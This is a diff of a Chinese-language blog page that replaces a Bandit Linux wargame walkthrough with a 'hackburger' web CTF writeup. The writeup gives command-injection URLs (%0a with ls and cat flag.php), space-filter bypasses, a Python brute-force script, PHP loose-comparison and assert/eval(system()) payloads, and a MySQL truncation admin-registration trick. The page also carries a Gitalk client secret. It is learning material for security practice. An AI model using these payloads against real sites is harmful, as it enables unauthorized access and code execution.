@@ -4,7 +4,7 @@
     <meta charset="utf-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
-    <title>Wargames-Linux 闯关游戏 &mdash; Evil</title>
+    <title>hackburger writeup &mdash; Evil</title>
     <link rel="stylesheet" href="http://localhost:4000/assets/vendor/primer-css/css/primer.css">
     <link rel="stylesheet" href="http://localhost:4000/assets/vendor/primer-markdown/dist/user-content.min.css">
     <link rel="stylesheet" href="http://localhost:4000/assets/vendor/octicons/octicons/octicons.css">
@@ -23,29 +23,29 @@
     
 
     
-    <link rel="canonical" href="http://localhost:4000/2018/08/24/linux_game/">
+    <link rel="canonical" href="http://localhost:4000/2018/08/31/hackburger/">
     <link rel="alternate" type="application/atom+xml" title="Evil" href="http://localhost:4000/feed.xml">
     
     <link rel="shortcut icon" href="http://localhost:4000/images/favicon.jpg" >
     
-    <meta property="og:title" content="Wargames-Linux 闯关游戏">
+    <meta property="og:title" content="hackburger writeup">
       
     <meta name="keywords" content="Web Security">
     <meta name="og:keywords" content="Web Security">
       
-    <meta name="description" content="Linux 闯关游戏的通关秘籍，想通过这个游戏来熟悉 linux 命令，参考别人的通关秘籍来做的，这里主要记录一下我自己的实操过程。">
-    <meta name="og:description" content="Linux 闯关游戏的通关秘籍，想通过这个游戏来熟悉 linux 命令，参考别人的通关秘籍来做的，这里主要记录一下我自己的实操过程。">
+    <meta name="description" content="全是 Web 安全的题目，很有意思而且还有一点难度，在这里记录一下题目的 writeup， 持续更新……">
+    <meta name="og:description" content="全是 Web 安全的题目，很有意思而且还有一点难度，在这里记录一下题目的 writeup， 持续更新……">
       
     
     
         
     
-    <meta property="og:url" content="http://localhost:4000/2018/08/24/linux_game/">
+    <meta property="og:url" content="http://localhost:4000/2018/08/31/hackburger/">
     <meta property="og:site_name" content="Evil">
     <meta property="og:type" content="article">
     <meta property="og:locale" content="zh_CN" />
     
-    <meta property="article:published_time" content="2018-08-24">
+    <meta property="article:published_time" content="2018-08-31">
     
     <script src="http://localhost:4000/assets/vendor/jquery/dist/jquery.min.js"></script>
     <script src="http://localhost:4000/assets/js/jquery-ui.js"></script>
@@ -77,29 +77,29 @@
     </header>
     <!-- / header -->
 
-    <section class="collection-head small geopattern" data-pattern-id="Wargames-Linux ">
+    <section class="collection-head small geopattern" data-pattern-id="hackburger writ">
 <div class="container">
   <div class="columns">
     <div class="column three-fourths">
       <div class="collection-title">
-        <h1 class="collection-header">Wargames-Linux 闯关游戏</h1>
+        <h1 class="collection-header">hackburger writeup</h1>
         <div class="collection-info">
           
           <span class="meta-info">
-            <span class="octicon octicon-calendar"></span> 2018/08/24
+            <span class="octicon octicon-calendar"></span> 2018/08/31
           </span>
           
           
           <span class="meta-info">
             <span class="octicon octicon-file-directory"></span>
-            <a href="http://localhost:4000/categories/program" title="program">program</a>
+            <a href="http://localhost:4000/categories/CTF" title="CTF">CTF</a>
           </span>
           
 
           
           <span class="meta-info">
             <span class="octicon octicon-tag"></span>
-            <a href="http://localhost:4000/tags/#linux" title="linux">linux</a>
+            <a href="http://localhost:4000/tags/#CTF" title="CTF">CTF</a>
           </span>
           
         </div>
@@ -113,79 +113,147 @@
 <div class="columns">
   <div class="column three-fourths" >
     <article class="article-content markdown-body">
-    <p>Linux 闯关游戏的通关秘籍，想通过<a href="http://overthewire.org/wargames/">这个游戏</a>来熟悉 linux 命令，参考别人的通关秘籍来做的，这里主要记录一下我自己的实操过程。</p>
-
-<p>参考:<br />
-<a href="https://mp.weixin.qq.com/s?__biz=MzI5MDQ2NjExOQ==&amp;mid=2247488103&amp;idx=1&amp;sn=4ac1dc8457ff4c72c046221d0286ae2e&amp;chksm=ec1e224fdb69ab5992e5fce1a6db4048367c4a2892259c731011b278f61d2ed5a73f28cac135&amp;token=603199687&amp;lang=zh_CN&amp;scene=21#wechat_redirect">Linux 闯关游戏之通关秘籍</a><br />
-<a href="https://mp.weixin.qq.com/s?__biz=MzI5MDQ2NjExOQ==&amp;mid=2247488132&amp;idx=1&amp;sn=149447e7b24735102ae296d945980b90&amp;chksm=ec1e22acdb69abba89e87c45cd4ee45ae103a552faf34d97aa46b2ef42f78aaad60060a1edfe&amp;mpshare=1&amp;scene=1&amp;srcid=0822cW0pbqBBcTAD2ymx9DWG%23rd">Linux 闯关游戏之通关秘籍续</a></p>
+    <p>全是 Web 安全的题目，很有意思而且还有一点难度，在这里记录一下题目的 writeup， 持续更新……</p>
 
 <!--more-->
 
-<h2 id="level-0--level-1">Level 0 → Level 1</h2>
+<h3 id="1warmup">1.Warmup</h3>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ssh -p 2220 bandit0@bandit.labs.overthewire.org 
+<p><strong>tips：</strong></p>
 
-$bandit0@bandit:~$ ls
-readme
-$bandit0@bandit:~$ cat readme 
-boJ9jbbUNNfktd78OOpsqOltutMc3MY1	=&gt; 下一关连接 ssh 的密码
+<p>这里主要就是利用<code class="highlighter-rouge">%0a</code> 做换行操作，猜测是命令执行，用%0a做换行操作。<br />
+这里列一下绕过空格的技巧<code class="highlighter-rouge">${IFS}</code> 或者 <code class="highlighter-rouge">&lt;&gt;</code></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://burger.laboratorium.ee:7999/?host=127.0.0.1%0als
+
+回显
+PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.040 ms
+
+--- 127.0.0.1 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 0.040/0.040/0.040/0.000 ms
+flag.php
+index.php
+robots.txt
 </code></pre></div></div>
 
-<h2 id="level-1--level-2">Level 1 → Level 2</h2>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ssh -p 2220 bandit1@bandit.labs.overthewire.org
-
-$bandit1@bandit:~$ ls
--
-$bandit1@bandit:~$ cat ./-
-CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /?host=127.0.0.1%0acat%20flag.php HTTP/1.1
 </code></pre></div></div>
 
-<h2 id="level-2--level-3">Level 2 → Level 3</h2>
+<h3 id="2file-search">2.File search</h3>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ssh -p 2220 bandit2@bandit.labs.overthewire.org
-$bandit2@bandit:~$ cat spaces\ in\ this\ filename	&lt;=&gt; 这里我直接使用 tab 键自动补齐
-UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK
+<p><strong>第一步：</strong>
+在输入框里面输入文件名里的字符发现回显响应的文件<br />
+同时输入与文件内容里面的字符也会回显包含该内容的文件</p>
+
+<p><strong>第二步：</strong>
+直接用脚本暴力破解</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#coding: utf-8</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">string</span>
+<span class="kn">import</span> <span class="nn">re</span>
+
+<span class="n">x</span> <span class="o">=</span> <span class="s">"_0123456789"</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">letters</span>
+<span class="n">url</span> <span class="o">=</span> <span class="s">"http://burger.laboratorium.ee:8004/"</span>
+
+<span class="n">ans</span> <span class="o">=</span> <span class="s">""</span>
+<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+    <span class="k">for</span> <span class="n">ch</span> <span class="ow">in</span> <span class="n">x</span><span class="p">:</span>
+        <span class="n">payload1</span> <span class="o">=</span> <span class="p">{</span><span class="s">"query"</span><span class="p">:</span><span class="n">ans</span><span class="o">+</span><span class="n">ch</span><span class="p">}</span>
+        <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">payload1</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s">"flag.txt"</span><span class="p">,</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">):</span>
+            <span class="n">ans</span> <span class="o">+=</span> <span class="n">ch</span>
+            <span class="k">print</span> <span class="s">"Flag:"</span> <span class="o">+</span> <span class="n">ans</span>
+            <span class="k">break</span>
+
+        <span class="n">payload2</span> <span class="o">=</span> <span class="p">{</span><span class="s">"query"</span><span class="p">:</span> <span class="n">ch</span><span class="o">+</span><span class="n">ans</span><span class="p">}</span>
+        <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">payload2</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s">"flag.txt"</span><span class="p">,</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">):</span>
+            <span class="n">ans</span> <span class="o">=</span> <span class="n">ch</span> <span class="o">+</span> <span class="n">ans</span>
+            <span class="k">print</span> <span class="s">"Flag:"</span> <span class="o">+</span> <span class="n">ans</span>
+            <span class="k">break</span>
+<span class="c">#t_h_e__f_l_a_g__i_s__4401ac27ffff3318dc0f6a3de050b4169e2eba97</span>
 </code></pre></div></div>
 
-<h2 id="level-3-level-4">Level 3→ Level 4</h2>
+<h3 id="3enter-password-to-get-candy">3.Enter password to get candy</h3>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ssh -p 2220 bandit3@bandit.labs.overthewire.org
-$bandit3@bandit:~$ cd inhere
-$bandit3@bandit:~/inhere$ cat .hidden
-pIwrPrtPN36QITSp3EQaw936yaFoFgAB
+<p><strong>猜测是 PHP 中字符串和 0 的弱比较问题</strong></p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> 
+<span class="nv">$a</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="nv">$b</span> <span class="o">=</span> <span class="s2">"flag?"</span><span class="p">;</span>
+<span class="k">if</span><span class="p">(</span><span class="nv">$a</span><span class="o">==</span><span class="nv">$b</span><span class="p">){</span>
+    <span class="k">echo</span> <span class="s2">"true"</span><span class="p">;</span>
+<span class="p">}</span><span class="k">else</span><span class="p">{</span>
+    <span class="k">echo</span> <span class="s2">"flase"</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span>
+// 输出是 true
 </code></pre></div></div>
 
-<h2 id="level-4-level-5">Level 4→ Level 5</h2>
+<p>所以这里</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ssh -p 2220 bandit4@bandit.labs.overthewire.org
-$bandit4@bandit:~/inhere$ ls
--file00  -file01  -file02  -file03  -file04  -file05  -file06  -file07  -file08  -file09
-$bandit4@bandit:~/inhere$ file ./*	&lt;=&gt;	"file" 命令辨识文件类型
-./-file00: data
-./-file01: data
-./-file02: data
-./-file03: data
-./-file04: data
-./-file05: data
-./-file06: data
-./-file07: ASCII text
-./-file08: data
-./-file09: data
-$bandit4@bandit:~/inhere$ cat ./-file07
-koReBOKuIDDepwhWk7jZC0RTdopnAYKh
+<p>修改 POST 数据</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>data={"password":true}
+
+或 
+
+data={"password":0}
+</code></pre></div></div>
+<p>即可得到 flag</p>
+
+<h3 id="4number-to-ascii-converter">4.Number to ASCII converter</h3>
+
+<h3 id="assert">assert()</h3>
+
+<p>PHP 5</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bool assert ( mixed $assertion [, string $description ] )
 </code></pre></div></div>
 
+<p>PHP 7</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bool assert ( mixed $assertion [, Throwable $exception ] )
+</code></pre></div></div>
+
+<p>assert() 会检查指定的 assertion 并在结果为 FALSE 时采取适当的响应。如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行。</p>
+
+<p><strong>step1</strong></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://burger.laboratorium.ee:8001/?number=phpinfo()
+</code></pre></div></div>
+
+<p>测试这里存在命令执行漏洞</p>
+
+<p><strong>step2</strong></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://burger.laboratorium.ee:8001/?number=eval(system("ls"))
+
+http://burger.laboratorium.ee:8001/?number=eval(system("cat where/is/the/flag/i/am/looking/for/flag.php"))
+查看源码搞定
+
+或者
+http://burger.laboratorium.ee:8001/?number=eval(system("grep -rn 'flag'*"))
+</code></pre></div></div>
+
+<h3 id="5we-tried-to-clone-pastebin">5.We tried to clone pastebin</h3>
+
+<h3 id="6thats-not-how-you-write-signup">6.That’s not how you write signup</h3>
+
+<p><strong>tips</strong>
+注册： <code class="highlighter-rouge">username = admin...很多空格...1</code><br />
+基于 mysql 截断漏洞就相当于注册了 <code class="highlighter-rouge">username = admin</code><br />
+之后就可以用注册时的密码登录，get flag.</p>
 
     </article>
   
     <div class="newold">
   <hr>
   
-  <b>上一篇: <a href="/2018/08/20/collect_mes/">渗透测试之信息收集</a></b><br>
+  <b>上一篇: <a href="/2018/08/24/linux_game/">Wargames-Linux 闯关游戏</a></b><br>
      
-  
-  <b>下一篇: <a href="/2018/08/31/hackburger/">hackburger writeup</a></b>
    
 </div><!--上一篇 下一篇-->
 
@@ -203,7 +271,7 @@ koReBOKuIDDepwhWk7jZC0RTdopnAYKh
         <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
         <script>
         var gitalk = new Gitalk({
-            id: '/2018/08/24/linux_game/',
+            id: '/2018/08/31/hackburger/',
             clientID: '5a59fdc570f933e0c2ee',
             clientSecret: '4bfb41f4315d6e67dc7d994890a4fc8bf9dee142',
             repo: 'blogcomments',
